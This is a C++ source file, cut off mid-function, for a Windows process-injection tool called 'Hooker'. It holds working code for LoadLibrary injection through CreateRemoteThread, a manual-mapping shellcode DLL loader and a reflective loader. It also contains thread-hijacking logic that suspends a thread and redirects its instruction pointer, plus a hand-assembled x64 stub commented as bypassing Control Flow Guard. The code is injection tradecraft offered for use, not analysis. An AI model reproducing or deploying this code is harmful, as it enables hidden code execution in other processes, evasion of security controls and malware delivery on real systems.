#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <iostream>
#include <fstream>
#include <cctype>
#include <vector>

#include "hooker.h"

//https://github.com/Paxai/DLLium
typedef HMODULE(WINAPI* f_LoadLibraryA)(const char* lpLibFileName);
typedef FARPROC(WINAPI* f_GetProcAddress)(HMODULE hModule, const char* lpProcName);
typedef BOOL(WINAPI* f_DLL_ENTRY_POINT)(void* hDll, DWORD dwReason, void* pReserved);
typedef BOOLEAN(WINAPI* f_RtlAddFunctionTable)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);

struct ShellcodeData {
    f_LoadLibraryA pLoadLibraryA;
    f_GetProcAddress pGetProcAddress;
    f_RtlAddFunctionTable pRtlAddFunctionTable;

    uintptr_t pDllBase;
    uintptr_t EntryPoint;

    uintptr_t RelocDir;
    uintptr_t ImportDir;
    uintptr_t ExceptionDir;
    uintptr_t ExceptionSize;
    uintptr_t TLSDir;
};

// Define a custom section set to calc shellcodeSize
#pragma section(".sc$a", read, execute)
#pragma section(".sc$b", read, execute)
#pragma section(".sc$c", read, execute)

// Place start marker in .sc$a
__declspec(allocate(".sc$a")) const unsigned char g_ShellcodeStartMarker = 'A';

// Place the function in .sc$b
__declspec(code_seg(".sc$b"))
// DLLium's remote dll loading shellcode (executed in remote proc)
__declspec(noinline) void __stdcall UniversalDllLoadingShellcode(ShellcodeData* pData) {
    if (!pData || !pData->pDllBase) {
        return;
    }

    uintptr_t pBase = pData->pDllBase;

    if (pData->ImportDir) {
        auto* pImportDescr = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pBase + pData->ImportDir);
        while (pImportDescr->Name) {
            char* szMod = reinterpret_cast<char*>(pBase + pImportDescr->Name);
            HMODULE hMod = pData->pLoadLibraryA(szMod);
            if (!hMod) {
                return;
            }

            auto* pIAT = reinterpret_cast<PIMAGE_THUNK_DATA>(pBase + pImportDescr->FirstThunk);

            PIMAGE_THUNK_DATA pThunk = pIAT;
            if (pImportDescr->OriginalFirstThunk) {
                pThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(pBase + pImportDescr->OriginalFirstThunk);
            }

            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pIAT->u1.Function = (uintptr_t)pData->pGetProcAddress(hMod, (LPCSTR)(pThunk->u1.Ordinal & 0xFFFF));
                }
                else {
                    auto* pImportByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(pBase + pThunk->u1.AddressOfData);
                    pIAT->u1.Function = (uintptr_t)pData->pGetProcAddress(hMod, pImportByName->Name);
                }
                pThunk++;
                pIAT++;
            }
            pImportDescr++;
        }
    }

    if (pData->TLSDir) {
        auto* pTLS = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pBase + pData->TLSDir);
        auto* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
        if (pCallback) {
            while (*pCallback) {
                (*pCallback)(reinterpret_cast<void*>(pBase), DLL_PROCESS_ATTACH, nullptr);
                pCallback++;
            }
        }
    }

    if (pData->pRtlAddFunctionTable && pData->ExceptionDir && pData->ExceptionSize) {
        auto* pFuncTable = reinterpret_cast<PRUNTIME_FUNCTION>(pBase + pData->ExceptionDir);
        DWORD count = (DWORD)(pData->ExceptionSize / sizeof(RUNTIME_FUNCTION));
        pData->pRtlAddFunctionTable(pFuncTable, count, (DWORD64)pBase);
    }

    if (pData->EntryPoint) {
        auto fEntryPoint = reinterpret_cast<f_DLL_ENTRY_POINT>(pBase + pData->EntryPoint);
        fEntryPoint(reinterpret_cast<void*>(pBase), DLL_PROCESS_ATTACH, nullptr);
    }
}

// Place end marker in .sc$c
__declspec(allocate(".sc$c")) const unsigned char g_ShellcodeEndMarker = 'C';

size_t GetUniversalShellcodeSize() {
    return (uintptr_t)&g_ShellcodeEndMarker - (uintptr_t)&g_ShellcodeStartMarker;
}

static void* ResolveFunction(void* ptr) {
    if (!ptr) return nullptr;

    unsigned char* b = static_cast<unsigned char*>(ptr);

    // Loop up to 10 times to resolve chained/nested thunks
    for (int i = 0; i < 10; ++i) {
        // 1. Standard 5-byte Relative JMP: E9 xx xx xx xx
        if (b[0] == 0xE9) {
            int32_t rel = *reinterpret_cast<int32_t*>(b + 1);
            b = b + 5 + rel;
            continue;
        }

        // 2. Short Relative JMP: EB xx
        if (b[0] == 0xEB) {
            int8_t rel = *reinterpret_cast<int8_t*>(b + 1);
            b = b + 2 + rel;
            continue;
        }

        // 3. RIP-Relative Indirect JMP without REX prefix: FF 25 xx xx xx xx (6 bytes)
        if (b[0] == 0xFF && b[1] == 0x25) {
            int32_t disp = *reinterpret_cast<int32_t*>(b + 2);
            void** target = reinterpret_cast<void**>(b + 6 + disp);
            if (!target || !*target) break;
            b = static_cast<unsigned char*>(*target);
            continue;
        }

        // 4. RIP-Relative Indirect JMP with REX.W prefix: 48 FF 25 xx xx xx xx (7 bytes)
        if (b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x25) {
            int32_t disp = *reinterpret_cast<int32_t*>(b + 3);
            void** target = reinterpret_cast<void**>(b + 7 + disp);
            if (!target || !*target) break;
            b = static_cast<unsigned char*>(*target);
            continue;
        }

        // No more thunks/jumps detected -> 'b' is the true function entry point!
        break;
    }

    return static_cast<void*>(b);
}

// GuidedHacking stuff
enum class BOOTSTRAP_STATE : ULONG_PTR
{
    Pending = 0,
    Executing = 1,
    Finished = 2
};

using f_Routine = DWORD(__fastcall*)(void* pArg);

#define ALIGN __declspec(align(8))

ALIGN struct BootstrapData {
    ALIGN BOOTSTRAP_STATE    State = BOOTSTRAP_STATE::Pending;
    ALIGN DWORD              Ret = 0;
    ALIGN DWORD              LastWin32Error = 0;
    ALIGN void*              pArg = nullptr;
    ALIGN f_Routine          pRoutine = nullptr;
    ALIGN UINT_PTR           Buffer = 0;
};

// Space reserved for SR_REMOTE_DATA (sizeof X void pointers, see above)
#define VOID_PTR_BUFFER 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
#define SR_REMOTE_DATA_BUFFER VOID_PTR_BUFFER VOID_PTR_BUFFER VOID_PTR_BUFFER VOID_PTR_BUFFER VOID_PTR_BUFFER VOID_PTR_BUFFER

#define ProcessHandleInformation 51 // handles in current proc
#define SystemProcessInformation 5  // handles in all procs

// Built-in structure for local handle snapshots
typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

#define ThreadBasicInformation 0

typedef struct _CLIENT_ID_NATIVE {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_NATIVE, * PCLIENT_ID_NATIVE;

typedef struct _THREAD_BASIC_INFORMATION_NATIVE {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID_NATIVE ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION_NATIVE, * PTHREAD_BASIC_INFORMATION_NATIVE;

// my funny code
std::string GetProcAccessDetails(DWORD granted) {
    struct { DWORD mask; const char* name; } flags[] = {
        {0x0001, "PROCESS_TERMINATE"},
        {0x0002, "PROCESS_CREATE_THREAD"},
        {0x0004, "PROCESS_SET_SESSIONID"},
        {0x0008, "PROCESS_VM_OPERATION"},
        {0x0010, "PROCESS_VM_READ"},
        {0x0020, "PROCESS_VM_WRITE"},
        {0x0040, "PROCESS_DUP_HANDLE"},
        {0x0080, "PROCESS_CREATE_PROCESS"},
        {0x0100, "PROCESS_SET_QUOTA"},
        {0x0200, "PROCESS_SET_INFORMATION"},
        {0x0400, "PROCESS_QUERY_INFORMATION"},
        {0x0800, "PROCESS_SUSPEND_RESUME"},
        {0x1000, "PROCESS_QUERY_LIMITED_INFORMATION"},
        {0x2000, "PROCESS_SET_LIMITED_INFORMATION"}
    };

    std::string access = "";
    for (auto& f : flags) {
        if (granted & f.mask) {
            access += std::string(f.name) + " | ";
        }
    }
    if (!access.empty()) {
        access = access.substr(0, access.size() - 3); // remove last " | "
    }
    else {
        return "no access";
    }
    std::string no_access = "";
    for (auto& f : flags) {
        if (!(granted & f.mask)) {
            no_access += std::string(f.name) + " | ";
        }
    }
    if (!no_access.empty()) {
        no_access = no_access.substr(0, no_access.size() - 3); // remove last " | "
    }
    else {
        return "full access";
    }
    return access + ", not including: " + no_access;
}

void PrintGrantedAccess(HANDLE h, int pid) {
    PUBLIC_OBJECT_BASIC_INFORMATION obi = {};
    ULONG ret = 0;
    NTSTATUS st = NtQueryObject(h, ObjectBasicInformation, &obi, sizeof(obi), &ret);
    if (st < 0) {
        std::cerr << "[!] Hooker: NtQueryObject failed at pid " << pid << ": 0x" << std::hex << st << "\n";
    }
    else {
        std::string details = GetProcAccessDetails(obi.GrantedAccess);
        std::cout << "[+] Hooker: GrantedAccess to pid " << pid << ": 0x" << std::hex << obi.GrantedAccess << std::dec << " -> " << details << "\n";
    }
}

// Inject DLL into target process via CreateRemoteThread + LoadLibrary onto DLL path
bool LoadLibraryInject(HANDLE hProcess, const std::string& dllPath, bool debug) {
    // Allocate memory for DLL path in target
    size_t size = dllPath.length() + 1;
    LPVOID dllPathAddr = VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!dllPathAddr) {
        std::cerr << "[!] Hooker: VirtualAllocEx failed. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }
    if (debug) {
        std::cout << "[*] Hooker: Allocated memory in target process at " << dllPathAddr << "\n";
    }

    // Write DLL path into target
    if (!WriteProcessMemory(hProcess, dllPathAddr, dllPath.c_str(), size, nullptr)) {
        std::cerr << "[!] Hooker: WriteProcessMemory failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    if (debug) {
        std::cout << "[*] Hooker: Wrote '" << dllPath << "' to target process memory\n";
    }

    // Get LoadLibraryA address
    HMODULE lpModuleHandle = GetModuleHandleA("kernel32.dll");
    if (!lpModuleHandle) {
        std::cerr << "[!] Hooker: GetModuleHandle failed\n";
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(lpModuleHandle, "LoadLibraryA");
    if (!loadLibAddr) {
        std::cerr << "[!] Hooker: GetProcAddress of LoadLibrary failed\n";
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create remote thread (start the DLL)
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, dllPathAddr, 0, nullptr);
    DWORD err = GetLastError();
    if (!hThread || err != 0) {
        std::cerr << "[!] Hooker: CreateRemoteThread failed. Error: " << err << "\n";
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    if (debug) {
        std::cout << "[*] Hooker: Created remote thread in target process\n";
    }

    DWORD wait = WaitForSingleObject(hThread, 10000); // 5 sec timeout for hooks to init
    if (wait == WAIT_TIMEOUT) {
        std::cerr << "[!] Hooker: remote thread did not finish within timeout\n";
        return false;
    }

    // Get exit code (for LoadLibrary, exit code == hModule handle)
    DWORD hModule = 0;
    if (!GetExitCodeThread(hThread, &hModule)) {
        std::cerr << "[!] Hooker: GetExitCodeThread failed. Error: " << GetLastError() << "\n";
        CloseHandle(hThread);
        return false;
    }
    CloseHandle(hThread);
    if (hModule == 0) {
        std::cerr << "[!] Hooker: LoadLibrary() failed: " << GetLastError() << "\n";
        return false;
    }

    std::cout << "[*] Hooker: remote routine succeeded, module handle: " << std::hex << hModule << "\n";
    return true;
}

// reflective loader from https://github.com/Reijaff/offensive_c/blob/main/loadlibrary_reflective_dll.c
// reflective loader helper
DWORD64 RvaToOffset(DWORD64 rva, DWORD64 base_address)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base_address;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base_address + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    if (rva < section->PointerToRawData) // pointer into PE header area
        return rva;

    for (; section->SizeOfRawData != 0; section++)
    {
        if (rva >= section->VirtualAddress && rva < (section->VirtualAddress + section->SizeOfRawData))
            return rva - section->VirtualAddress + section->PointerToRawData;
    }
    return 0;
}

// reflective loader helper
DWORD64 GetReflectiveLoaderOffset(DWORD64 base_address, LPCSTR ReflectiveLoader_name)
{
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);
    IMAGE_DATA_DIRECTORY exports_data_directory = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exports_data_directory.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)(base_address + RvaToOffset(exports_data_directory.VirtualAddress, base_address));
    DWORD* functions = (DWORD*)(base_address + RvaToOffset(export_directory->AddressOfFunctions, base_address));
    DWORD* names = (DWORD*)(base_address + RvaToOffset(export_directory->AddressOfNames, base_address));
    WORD* ords = (WORD*)(base_address + RvaToOffset(export_directory->AddressOfNameOrdinals, base_address));

    for (DWORD i = 0; i < export_directory->NumberOfNames; ++i)
    {
        char* name = (char*)(base_address + RvaToOffset(names[i], base_address));
        if (_stricmp(name, ReflectiveLoader_name) == 0) // case-insensitive
        {
            DWORD func_rva = functions[ords[i]];
            return RvaToOffset(func_rva, base_address);
        }
    }
    return 0;
}

typedef struct _SYSTEM_THREAD_INFORMATION_LITE {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID_NATIVE ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState; // 5 = Waiting
    ULONG WaitReason;  // 8 = UserRequest
} SYSTEM_THREAD_INFORMATION_LITE, * PSYSTEM_THREAD_INFORMATION_LITE;

typedef NTSTATUS(NTAPI* pfnNtGetNextThread)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
    );

typedef NTSTATUS(NTAPI* pfnNtQueryInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
    );

#define ThreadSystemThreadInformation 40

// Check if a thread is safe to hijack
BOOL CheckIfThreadSafeToHijack(HANDLE hThread, bool debug) {
    return true; // yolo, todo: this should search for a fitting thread

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    auto NtQueryInformationThread = (pfnNtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");
    if (!NtQueryInformationThread) return FALSE;

    SYSTEM_THREAD_INFORMATION_LITE threadInfo = { 0 };
    ULONG returnLength = 0;

    // Querying ThreadSystemThreadInformation returns State and WaitReason for a handle
    NTSTATUS status = NtQueryInformationThread(
        hThread,
        (ULONG)ThreadSystemThreadInformation,
        &threadInfo,
        sizeof(threadInfo),
        &returnLength
    );

    if (status == 0) {
        // State 5 = Waiting, WaitReason 8 = UserRequest
        return (threadInfo.ThreadState == 5 && threadInfo.WaitReason == 8);
    }

    return FALSE;
}

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;


BOOL CheckThreadHandleAccess(HANDLE hThread) {
    if (!hThread || hThread == INVALID_HANDLE_VALUE) return FALSE;

    PUBLIC_OBJECT_BASIC_INFORMATION basicInfo = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryObject(
        hThread,
        ObjectBasicInformation,
        &basicInfo,
        sizeof(basicInfo),
        &returnLength
    );

    if (status == 0) { // STATUS_SUCCESS
        return (basicInfo.GrantedAccess & THREAD_ALL_ACCESS) == THREAD_ALL_ACCESS;
    }

    return FALSE;
}

// get McFullAccess mit Hendle
HANDLE GetFullAccessThread(DWORD targetProcessId, bool debug) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[!] Hooker: Cannot find ntdll.dll handle\n");
        return NULL;
    }

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    if (!hK32) {
        printf("[!] Hooker: Cannot find kernel32.dll handle\n");
        return NULL;
    }

    auto NtQueryInformationProcess = (long (WINAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, "NtQueryInformationProcess");
    auto NtQuerySystemInformation = (long (WINAPI*)(ULONG, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQueryInformationProcess || !NtQuerySystemInformation) {
        printf("[!] Hooker: Cannot find required functions\n");
        return NULL;
    }

    ULONG bufferSize = 0x4000;
    ULONG returnLength = 0;
    NTSTATUS status = NULL;

    PVOID sysInfoBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (sysInfoBuffer == 0) {
        printf("[!] Hooker: Cannot allocate mem for query information buffer\n");
        return NULL;
    }

    PVOID procBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (procBuffer == 0) {
        printf("[!] Hooker: Cannot allocate mem for query information buffers\n");
        VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
        return NULL;
    }

    // 1. Get the System Process/Thread info buffer first to verify states
    status = NtQuerySystemInformation(SystemProcessInformation, sysInfoBuffer, bufferSize, &returnLength);
    if (status == 0xC0000004) { // Length mismatch
        VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
        bufferSize = returnLength;
        sysInfoBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = NtQuerySystemInformation(SystemProcessInformation, sysInfoBuffer, bufferSize, &returnLength);
    }
    if (status != 0) {
        printf("[!] Hooker: Cannot read SystemProcessInformation to find threads\n");
        VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
        VirtualFree(procBuffer, 0, MEM_RELEASE);
        return NULL;
    }

    // 2. Query our internal process handle table
    status = NtQueryInformationProcess(GetCurrentProcess(), ProcessHandleInformation, procBuffer, bufferSize, &returnLength);
    if (status == 0xC0000004) { // Length mismatch
        VirtualFree(procBuffer, 0, MEM_RELEASE);
        bufferSize = returnLength;
        procBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = NtQueryInformationProcess(GetCurrentProcess(), 20, procBuffer, bufferSize, &returnLength);
    }
    if (status != 0) {
        printf("[!] Hooker: Cannot read ProcessHandleInformation to find threads\n");
        VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
        VirtualFree(procBuffer, 0, MEM_RELEASE);
        return NULL;
    }

    HANDLE preferredHandle = NULL;

    auto* localHandles = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(procBuffer);
    if (localHandles == nullptr || localHandles->NumberOfHandles == 0) {
        printf("[!] Hooker: No handles found in current process\n");
        VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
        VirtualFree(procBuffer, 0, MEM_RELEASE);
        return NULL;
    }

    // 3. check if any thread handle from the remote proc is in the current process
    PSYSTEM_PROCESS_INFORMATION currentProc = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(sysInfoBuffer);
    do {
        if (reinterpret_cast<uintptr_t>(currentProc->UniqueProcessId) == targetProcessId) {

            if (debug)
                printf("[+] Hooker: Got remote process information, traversing the remote processes threads...\n");

            PSYSTEM_THREAD_INFORMATION threads = reinterpret_cast<PSYSTEM_THREAD_INFORMATION>(
                reinterpret_cast<uintptr_t>(currentProc) + sizeof(SYSTEM_PROCESS_INFORMATION)
            );

            // traverse remote threads
            for (ULONG t = 0; t < currentProc->NumberOfThreads; ++t) { 
                DWORD remoteTID = static_cast<DWORD>(reinterpret_cast<uintptr_t>(threads[t].ClientId.UniqueThread));

                // check if the local proc has handles to the remote threads -> traverse all local handles
                for (ULONG_PTR l = 0; l < localHandles->NumberOfHandles; l++) { 
                    PROCESS_HANDLE_TABLE_ENTRY_INFO entry = localHandles->Handles[l];
                    HANDLE hThreadLocal = reinterpret_cast<HANDLE>(entry.HandleValue);

                    DWORD localTID = GetThreadId(hThreadLocal); // check if this is a thread handle
                    if (localTID == 0 || entry.GrantedAccess != THREAD_ALL_ACCESS) continue;

                    if (debug)

                    if (remoteTID == localTID) {
                        if (CheckIfThreadSafeToHijack(hThreadLocal, debug)) {
                            if (debug)
                                printf("[+] Hooker: Found thread handle (tid=%i) of remote process in current process with full access and is safe to hijack\n", localTID);

                            VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
                            VirtualFree(procBuffer, 0, MEM_RELEASE);
                            return hThreadLocal;
                        }
                        else {
                            if (debug)
                                printf("[+] Hooker: Found thread handle (tid=%i) of remote process in current process with full access but is not safe to hijack\n", localTID);
                        }
                    }
                }

                if (debug)
                    printf("[-] Hooker: Found no existing thread handles of remote process (pid=%i) in current process, now trying with OpenThread...\n", targetProcessId);

                // fallback: check if the local proc can open any remote thread with full access
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, remoteTID);
                if (CheckThreadHandleAccess(hThread)) {
                    if (CheckIfThreadSafeToHijack(hThread, debug)) {
                        if (debug)
                            printf("[+] Hooker: Remote thread (tid=%i) can be opened from the current proc with full access and is safe to hijack\n", remoteTID);
                        return hThread;
                    }
                    if (debug)
                        printf("[+] Hooker: Remote thread (tid=%i) can be opened from the current proc but is not safe to hijack\n", remoteTID);
                }
                else {
                    if (debug)
                        printf("[+] Hooker: Remote thread (tid=%i) cannot be opened from current proc with full access\n", remoteTID);
                }
            }
            break; // found target pid, but no thread handles
        }

        currentProc = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<uintptr_t>(currentProc) + currentProc->NextEntryOffset);
    } while (currentProc->NextEntryOffset != 0);

    VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
    VirtualFree(procBuffer, 0, MEM_RELEASE);
    return preferredHandle;
}

bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID localAddr) {
    if (!remoteAddrs.empty()) {
        for (LPVOID addr : remoteAddrs) {
            if (addr) {
                VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
            }
        }
    }
    if (localAddr) {
        VirtualFree(localAddr, 0, MEM_RELEASE);
    }
    CloseHandle(hProcess);
    return false;
}

/* 
* cleanly hijack a thread (hopefully)
* 1. get a thread, suspend it and store the old RIP
* 2. define setup shellcode for clean prologue and epilogue
* 3. patch the setup shellcode with the old RIP (to continue at old context) and the remote routine (to be executed) with its args
* 4. write the patched shellcode to the remote process
* 5. set the RIP to the new setup shellcode and resume the thread
* 6. read back the memory to check if the execution was successful
*/
bool HijackThread(HANDLE hProcess, LPVOID pRemoteRoutine, LPVOID pRemoteArgs, bool debug) {

    if (debug)
        printf("[*] Hooker: Attempting thread hijacking in target process\n");

    // Identify and target a specific thread ID in the target process, or own process if already inherited
    if (debug)
        printf("[*] Hooker: Trying to get a thread handle to the remote process pid=%i\n", GetProcessId(hProcess));
    HANDLE hThread = GetFullAccessThread(GetProcessId(hProcess), debug);
    if (hThread == NULL) {
        printf("[!] Hooker: Failed to get a thread handle with full access to the remote process\n");
        return false;
    }

    // Suspend the target thread to safely modify its state
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[!] Hooker: SuspendThread failed for thread (tid=%i): %lu\n", GetThreadId(hThread), GetLastError());
        CloseHandle(hThread);
        return false;
    }
    if (debug)
        printf("[+] Hooker: Suspended thread (tid=%i)\n", GetThreadId(hThread));

    // Capture the current register state (specifically RIP) of the thread
    CONTEXT threadContext{ 0 };
    threadContext.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &threadContext)) {
        printf("[!] Hooker: GetThreadContext failed for thread (tid=%i): %lu\n", GetThreadId(hThread), GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // x64 remote Shellcode bootstrap stub
    BYTE BootstrapShellcode[] =
    {
        SR_REMOTE_DATA_BUFFER

        // =========================================================================
        // PHASE 1: Original Thread Context Staging
        // Moves original RIP into RAX and pushes it onto the stack first.
        // At the very end of the stub, this pushed address will be the final RET target.
        // =========================================================================
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // [0x00] mov rax, OldRIP (Patched dynamically)
        0x50,                                                                   // [0x0A] push rax

        // =========================================================================
        // PHASE 2: Register & CPU State Preservation
        // Saves volatile registers, flags, and non-volatile RBX to preserve the thread's
        // exact state prior to hijacking.
        // =========================================================================
        0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,       // [0x0B] push volatile regs (RAX, RCX, RDX, R8-R11)
        0x9C,                                                                   // [0x16] pushfq (Push CPU flags)
        0x53,                                                                   // [0x17] push rbx

        // =========================================================================
        // PHASE 3: Data Structure Resolution & Execution Status Update
        // Calculates RIP-relative pointer to BootstrapData and updates state to "Executing".
        // =========================================================================
        0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00,                               // [0x18] lea rbx, [BootstrapData] (Patched dynamically)
        0xC6, 0x03, 0x01,                                                       // [0x1F] mov byte ptr [rbx], 1 (BOOTSTRAP_STATE = Executing)

        // =========================================================================
        // PHASE 4: Win64 ABI Stack Alignment & Argument Setup
        // Establishes a frame pointer, enforces 16-byte stack alignment required by 
        // x64 calling convention, loads RCX (1st argument), and allocates 32-byte shadow space.
        // =========================================================================
        0x55,                                                                   // [0x22] push rbp
        0x48, 0x8B, 0xEC,                                                       // [0x23] mov rbp, rsp
        0x48, 0x83, 0xE4, 0xF0,                                                 // [0x26] and rsp, -0x10 (16-byte align RSP)
        0x48, 0x8B, 0x4B, 0x18,                                                 // [0x2A] mov rcx, [rbx + 0x18] (Load BootstrapData::pArg into RCX)
        0x48, 0x83, 0xEC, 0x20,                                                 // [0x2E] sub rsp, 0x20 (Reserve shadow space)

        // =========================================================================
        // PHASE 5: CFG-Bypass Target Invocation (Push-Ret Pivot)
        // Avoids indirect CALL (FF /2) to bypass Control Flow Guard (CFG).
        // Calculates return address within the stub, pushes it, pushes target function, and executes RET to jump into BootstrapData::pRoutine.
        // =========================================================================
        0x48, 0x8D, 0x05, 0x0D, 0x00, 0x00, 0x00,                               // [0x32] lea rax, [rip + 0x0D] (Point to 'add rsp, 0x20')
        0x50,                                                                   // [0x39] push rax (Push return address)
        0xFF, 0x73, 0x20,                                                       // [0x3A] push qword ptr [rbx + 0x20] (Push BootstrapData::pRoutine)
        0xC3,                                                                   // [0x3D] ret (Jumps to BootstrapData::pRoutine; returns to offset 0x3E)

        // =========================================================================
        // PHASE 6: Post-Execution Cleanup & Return Value Capture
        // Cleans up shadow space and saves BootstrapData::pRoutine's return value (RAX).
        // =========================================================================
        0x48, 0x83, 0xC4, 0x20,                                                 // [0x3E] add rsp, 0x20 (Clean shadow space)
        0x48, 0x89, 0x43, 0x08,                                                 // [0x42] mov [rbx + 0x08], rax (Store ReturnValue in BootstrapData::Ret)
        0x48, 0x8B, 0xE5,                                                       // [0x46] mov rsp, rbp (Restore RSP)
        0x5D,                                                                   // [0x49] pop rbp

        // =========================================================================
        // PHASE 7: Thread Environment Capture & Completion Signaling
        // Fetches GetLastError via TEB (GS:[0x30] -> offset 0x68) and marks state as "Finished".
        // =========================================================================
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,                   // [0x4A] mov rax, gs:[0x30] (TEB pointer)
        0x8B, 0x40, 0x68,                                                       // [0x53] mov eax, [rax + 0x68] (TEB.LastErrorValue)
        0x89, 0x43, 0x10,                                                       // [0x56] mov [rbx + 0x10], eax (Store LastWin32Error)
        0xC6, 0x03, 0x02,                                                       // [0x59] mov byte ptr [rbx], 2 (BOOTSTRAP_STATE = Finished)

        // =========================================================================
        // PHASE 8: Register Restoration & Thread Execution Resume
        // Restores original thread registers in reverse order. The final RET pops
        // OldRIP (pushed in Phase 1) back into RIP to seamlessly resume original execution.
        // =========================================================================
        0x5B,                                                                   // [0x5C] pop rbx
        0x9D,                                                                   // [0x5D] popfq (Restore flags)
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58,       // [0x5E] pop volatile regs (R11-R8, RDX, RCX, RAX)
        0xC3                                                                    // [0x69] ret (Return to OldRIP)
    };

    size_t ripOffsetInBootstrap = sizeof(BootstrapData) + 0x02; // mov(2) XX XX XX XX XX XX XX XX

    // Patch the old RIP into the shellcode return sequence (right after SR_REMOTE_DATA)
